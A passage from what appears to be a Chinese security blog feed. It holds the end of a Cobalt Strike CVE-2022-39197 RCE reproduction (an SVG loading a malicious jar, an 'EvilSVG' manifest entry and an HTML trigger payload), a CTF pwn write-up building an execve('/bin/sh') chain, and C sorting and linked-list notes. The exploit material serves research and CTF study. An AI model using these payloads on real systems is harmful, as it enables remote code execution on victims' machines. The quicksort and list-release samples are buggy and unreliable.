&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后准备好svg和清单：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//1.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span> = <span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span> = <span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">&quot;0 0 0 0 &quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;5.jar&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//Manifest</span><br>Manifest-<span class="hljs-keyword">Version</span>: 1.0<br>SVG-Handler-<span class="hljs-keyword">Class</span>: org.spring.<span class="hljs-keyword">test</span>.EvilSVG<br></code></pre></td></tr></table></figure><p>其实这里也可以直接使用maven去添加SVG-Handler-Class：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">spring.svg</span>&gt;</span>org.spring.test.EvilSVG<span class="hljs-tag">&lt;/<span class="hljs-name">spring.svg</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">....</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">SVG-Handler-Class</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;spring.svg&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">SVG-Handler-Class</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span></span><br><span class="language-xml">             <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>首先编译代码。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">mvn</span> clean install -DskipTests<br></code></pre></td></tr></table></figure><p>将代码编译好之后，来到target&#x2F;classes目录下，将Manifest，编译好的包一起打包进1.jar，命令是：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cmf Manifest <span class="hljs-number">5</span>.<span class="hljs-keyword">jar </span><span class="hljs-keyword">org</span><br></code></pre></td></tr></table></figure><p>这里Mainfest文件不知道为什么就是打包不进去，后来就直接通过pom来添加键值对了：</p><p><a href="https://blog.csdn.net/kanyun123/article/details/113057783">https://blog.csdn.net/kanyun123/article/details/113057783</a></p><p>或者直接手动修改：</p><img src="/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019153039339.png" class="" title="image-20221019153039339"><p>开一个http，然后CS beacon处打上note触发漏洞：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;URI&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://127.0.0.1:8000/1.svg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019154525962.png" class="" title="image-20221019154525962"><p>演示：</p><p><video id="video" controls="" preload="none"> <source id="mp4" src="https://spr1n9t1me.github.io/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-分析复现/CS_RCE.mp4" type="video/mp4"> </video></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_practice</title>
    <link href="/2022/10/01/pwn-practice/"/>
    <url>/2022/10/01/pwn-practice/</url>
    
    <content type="html"><![CDATA[<p>栈基础知识：<a href="http://tttang.com/archive/1361/">http://tttang.com/archive/1361/</a></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p><a href="https://sillyrabbit.cn/pwn/ciscn_2019_s_3/">https://sillyrabbit.cn/pwn/ciscn_2019_s_3/</a></p><p>检查保护，栈题没开pie和canary。首先main函数给了一个栈溢出：</p><img src="/2022/10/01/pwn-practice/image-20221001191315162.png" class="" title="image-20221001191315162"><p>使用的是sys_read和sys_write系统调用，允许输入0x400字节，然后输出0x30字节。</p><p>看到栈溢出想到常规思路，没有后门函数，没有libc里的函数put、write等的调用因此不能泄露地址ret2libc，但是注意到gadget函数的汇编代码:</p><img src="/2022/10/01/pwn-practice/image-20221001191946682.png" class="" title="image-20221001191946682"><p>两个mov控制了rax寄存器，值分别是15(sys_rt_sigreturn)和59(sys_execve)；后面看到wp的才知道，这里其实是给syscall调用做铺垫，这题我们需要利用syscall来解决，首先需要控制几个寄存器的值。</p><p>rax直接用给的gadget即可，rdi有，所以最主要的问题是rdx，这里是利用了csu的通用gadget来间接控制rdx</p><p>然后execv(rdi,rsi,rdx)，其中rdi&#x3D;”&#x2F;bin&#x2F;sh\x00”，rsi&#x3D;rdx&#x3D;0。使用如下通用gadget:</p><img src="/2022/10/01/pwn-practice/image-20221002125333875.png" class="" title="image-20221002125333875"><p>注意vuln函数结尾的指令：</p><img src="/2022/10/01/pwn-practice/image-20221002123604737.png" class="" title="image-20221002123604737"><p>局部函数直接ret没有leave，这意味着函数返回时不会清空栈的内容，那么这样我们就能够在栈上写入&#x2F;bin&#x2F;sh，然后通过write来泄露&#x2F;bin&#x2F;sh相对栈顶的偏移得到其地址，最终就可以使用&#x2F;bin&#x2F;sh。</p><h3 id="泄露-x2F-bin-x2F-sh"><a href="#泄露-x2F-bin-x2F-sh" class="headerlink" title="泄露&#x2F;bin&#x2F;sh"></a>泄露&#x2F;bin&#x2F;sh</h3><p>首先使用gdb调试，断点打在vuln函数的sys_read处。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> ./pwn<br><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x400501<br></code></pre></td></tr></table></figure><p>然后run</p><img src="/2022/10/01/pwn-practice/image-20221002133744199.png" class="" title="image-20221002133744199"><p>下一步输入aaaa，去观察一下字符串的位置。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search aaaa</span><br></code></pre></td></tr></table></figure><img src="/2022/10/01/pwn-practice/image-20221002133852883.png" class="" title="image-20221002133852883"><p>查看其距离rsp的地址计算偏移，再通过write泄露栈基地址(write(20)之后的八字节就是栈的基地址)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每日C</title>
    <link href="/2022/09/21/%E6%AF%8F%E6%97%A5C/"/>
    <url>/2022/09/21/%E6%AF%8F%E6%97%A5C/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="day1-排序"><a href="#day1-排序" class="headerlink" title="day1 排序"></a>day1 排序</h2><p>大纲要求：冒泡排序、选择排序、快速排序</p><h3 id="1-快速排序"><a href="#1-快速排序" class="headerlink" title="1.快速排序"></a>1.快速排序</h3><p>快速排序算法通过多次比较和交换来实现排序，其排序流程如下：  </p><p>(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。  </p><p>(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值。  </p><p>(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。  </p><p>(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。</p><p><strong>要点：选取一个基准x(可以选取中间的元素或者第一个元素)，选取起点start与终点end，每次循环都把比基准大的值放在右边，比基准小的值放在左边，左边从下标i&#x3D;start递增，右边下标从j&#x3D;end递减；</strong></p><p><strong>循环一次之后a[i]左边都比x小，右边都比x大；把基准和a[i]替换，然后再递归即可完成排序。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">quickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> end)</span>    <span class="hljs-comment">//start和end都是指下标</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,temp,x;<br>    i=start;<br>    j=end;<br>    x=a[start];    <span class="hljs-comment">//选取基准值</span><br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; x&lt;a[j])    <span class="hljs-comment">//从右向左搜索小于基准值的数,让j等于它的下标</span><br>            j--;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; x&gt;a[i])    <span class="hljs-comment">//从左向右搜索大于基准值的数,让i等于它的下标</span><br>            i++;<br>        <span class="hljs-keyword">if</span>(i&lt;j)    <span class="hljs-comment">//在满足i&lt;j的条件下，交换a[i]和a[j]的值 </span><br>        &#123;<br>            temp=a[j];<br>            a[j]=a[i];<br>            a[i]=temp;<br>        &#125;<br>    &#125;<br>    temp=x;   <span class="hljs-comment">//跳出循环之后，把基准值和a[i]调换 </span><br>    x=a[i];<br>    a[i]=temp;<br>    <span class="hljs-keyword">if</span>(start&lt;j)    <span class="hljs-comment">//递归 </span><br>        kuaipai(a,start,j<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span>(i&lt;end)<br>        kuaipai(a,j+<span class="hljs-number">1</span>,end);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> s[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,s[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>&#125;;<br>print(a,<span class="hljs-number">8</span>);    <span class="hljs-comment">//先在屏幕上输出原来的数字序列 </span><br>kuaipai(a,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>);    <span class="hljs-comment">//调用快排函数，将a排序 </span><br>print(a,<span class="hljs-number">8</span>);    <span class="hljs-comment">//输出排好序的数字序列 </span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-冒泡排序"><a href="#2-冒泡排序" class="headerlink" title="2.冒泡排序"></a>2.冒泡排序</h3><p>要点：每次遍历把最大的数放到最后，循环n次后就完成从小到到大的排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> L)</span>&#123;<br><span class="hljs-type">int</span> t;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;L<span class="hljs-number">-1</span>;i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;L-i<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[j]&gt;<span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>])&#123;<br>t=<span class="hljs-built_in">array</span>[j];<br><span class="hljs-built_in">array</span>[j]=<span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>];<br><span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>]=t;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3.选择排序"></a>3.选择排序</h3><p>要点：选取最小元素的下标，初始值为0；与冒泡排序相反，冒泡排序是一轮循环把最大的元素放到最后一位a[n]，下一次循环从0到n-1，选择排序是一轮循环把最小的数放到开头a[0]，下一次循环从1到n，循环n次后就完成了排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arraySort</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> L)</span>&#123;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-type">int</span> min=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> temp;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;L<span class="hljs-number">-1</span>;i++)&#123;<br>min=i;<br><span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L;j++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[j]&lt;<span class="hljs-built_in">array</span>[min])&#123;<br>min=j;  <span class="hljs-comment">//最小值与本次循环开头元素交换</span><br>&#125;<br>&#125;<br><br>temp=<span class="hljs-built_in">array</span>[min]; <span class="hljs-comment">//完成上述交换</span><br><span class="hljs-built_in">array</span>[min]=<span class="hljs-built_in">array</span>[i];<br><span class="hljs-built_in">array</span>[i]=temp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="day2-链表"><a href="#day2-链表" class="headerlink" title="day2 链表"></a>day2 链表</h2><p>大纲要求：创建单向动态链表(创建)、输出链表(遍历)、释放列表(删除)</p><p>不考顺序表。</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220921222427122.png" class="" title="image-20220921222427122"><h3 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//师姐资料里的</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEN sizeof(struct Stu)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">float</span> score;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">next</span>;</span><br>&#125;;<br><span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">struct</span> Stu * <span class="hljs-title function_">creat</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">head</span>=</span><span class="hljs-literal">NULL</span>,*p1,*p2;<br>p1=p2=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);<br><span class="hljs-keyword">while</span>(p1-&gt;num)<br>&#123;<br>n++;<br><span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)<br>head=p1;<br><span class="hljs-keyword">else</span><br>&#123;<br>p2-&gt;next=p1;<br>p2=p1;<br>&#125;<br>p1=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);<br>&#125;<br>p2-&gt;next=<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu* head)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>*<span class="hljs-title">p</span>=</span>head;<br><span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d:%5.1f\n&quot;</span>,p-&gt;num,p-&gt;score);<br>p=p-&gt;next;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> Stu *<span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu *head,<span class="hljs-keyword">struct</span> Stu *p)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">p1</span>=</span>head,*p2=head;<br><span class="hljs-keyword">if</span>(head==<span class="hljs-literal">NULL</span>)<br>&#123;head=p;p-&gt;next=<span class="hljs-literal">NULL</span>;&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">while</span>((p-&gt;num&gt;p1-&gt;num)&amp;&amp;(p1-&gt;next!=<span class="hljs-literal">NULL</span>))<br>&#123;p2=p1;p1=p1-&gt;next;&#125;<br><span class="hljs-keyword">if</span>(p1==head)<br>&#123;head=p;p-&gt;next=p1;&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">if</span>(p-&gt;num&lt;p1-&gt;num)<br>&#123;p2-&gt;next=p;p-&gt;next=p1;&#125;<br><span class="hljs-keyword">else</span><br>&#123;p1-&gt;next=p;p-&gt;next=<span class="hljs-literal">NULL</span>;&#125;<br>&#125;<br>n++;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-keyword">struct</span> Stu *<span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu *head,<span class="hljs-type">int</span> num)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">p1</span>=</span>head,*p2;<br><span class="hljs-keyword">while</span>(num!=p1-&gt;num&amp;&amp;p1-&gt;next!=<span class="hljs-literal">NULL</span>)<br>&#123;p2=p1;p1=p1-&gt;next;&#125;<br><span class="hljs-keyword">if</span>(p1-&gt;num==num)<br>&#123;<br><span class="hljs-keyword">if</span>(p1==head)<br>head=p1-&gt;next;<br><span class="hljs-keyword">else</span><br>p2-&gt;next=p1-&gt;next;<br>n--;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cannot founf!\n&quot;</span>);<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu** head)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>* <span class="hljs-title">p</span>;</span><br><span class="hljs-keyword">while</span>(head!=<span class="hljs-literal">NULL</span>)<br>&#123;<br>p=*head;<br>*head=p-&gt;next;<br><span class="hljs-built_in">free</span>(p);<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>*<span class="hljs-title">head</span>=</span>creat();<br>print(head);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">in</span>;</span><br>in=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;in-&gt;num,&amp;in-&gt;score);<br>print(head=insert(head,in));<br><span class="hljs-type">int</span> num;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>print(del(head,num));<br>release(&amp;head);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="day3-文件操作"><a href="#day3-文件操作" class="headerlink" title="day3 文件操作"></a>day3 文件操作</h2><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>您可以使用 <strong>fopen( )</strong> 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 <strong>FILE</strong> 的一个对象，类型 <strong>FILE</strong> 包含了所有用来控制流的必要的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode )</span>;<br></code></pre></td></tr></table></figure><p>filename是文件名，访问模式mode有以下形式：</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">打开一个已有的文本文件，允许读取文件。</td></tr><tr><td align="left">w</td><td align="left">打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td></tr><tr><td align="left">a</td><td 